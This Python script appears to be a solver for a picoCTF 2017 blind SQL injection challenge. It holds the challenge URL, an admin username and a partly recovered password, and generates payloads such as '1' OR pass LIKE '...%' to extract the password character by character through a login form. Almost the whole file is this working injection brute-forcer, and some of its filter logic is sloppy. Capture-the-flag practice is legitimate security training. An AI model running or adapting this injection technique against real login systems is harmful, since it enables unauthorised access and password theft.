import requests

sql_noeyes = 'http://shell2017.picoctf.com:21088/'
sql_username = 'admin'
sql_password = 'not_all_errors_should_be_shown_3c826cdcbf6f146ac6f86e6b65d3b1de'

#53 characters in password
#select * from users where pass = '1' OR pass LIKE '__w%';
#1' OR pass LIKE '%{%
#1' OR pass LIKE '__w%
#1' OR pass LIKE 'not_a%

password_contains_list = ['a', 'b', 'c', 'd', 'e', 'f',
                          'h', 'l', 'n', 'o', 'r', 's',
                          't', 'u', 'w', '1', '2', '3',
                          '4', '5', '6', '8', '_']


def check_with_server(username, password):
    payload = {'username': username, 'password': password}

    headers = requests.utils.default_headers()
    headers.update(
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
        })

    r = requests.post(sql_noeyes, params=payload, headers=headers)
    print(r.text)
    return True


def get_password_contains_string(n):
    return "1' OR pass LIKE '%" + n + "%"


def get_password_at_string(at, n):
    x = ''
    for i in range(0, at, 1):
        x += '_'
    return "1' OR pass LIKE '" + x + n + "%"


def get_password_at_string_(n):
    return "1' OR pass LIKE '" + sql_password + n + "%"


def check_contains():
    def check(character):
        sql_injection_password = get_password_contains_string(character)
        print(sql_injection_password)

        #if check_with_server(sql_username, sql_injection_password):
            #password_contains_list.append(character)

    for i in range(ord('a'), ord('z') + 1, 1):
        check(chr(i))

    for i in range(ord('0'), ord('9') + 1, 1):
        check(chr(i))

    password_contains_list.append('_')


def check_contains_ending():

    def check(character):
        sql_injection_password = "1' OR pass LIKE '" + sql_password + "%" + character + "%"
        print(sql_injection_password)

    for i in range(ord('a'), ord('z') + 1, 1):
        check(chr(i))

    for i in range(ord('0'), ord('9') + 1, 1):
        check(chr(i))

    password_contains_list.append('_')


def brute_force_password():
    print(str(len(sql_password)) + "/63" + " -> " + str(len(sql_password) / 63))
    if len(sql_password) < 63:
        for i in password_contains_list:
            print(get_password_at_string_(i))

def brute_force_password_ending():
    print(str(len(sql_password)) + "/63" + " -> " + str(len(sql_password) / 63))
    if len(sql_password) < 63:
        for i in password_contains_list:
            if not i >= 'h' and i <= 'w':
                print(get_password_at_string_(i))

def main():
    brute_force_password_ending()
    #check_contains_ending()

main()
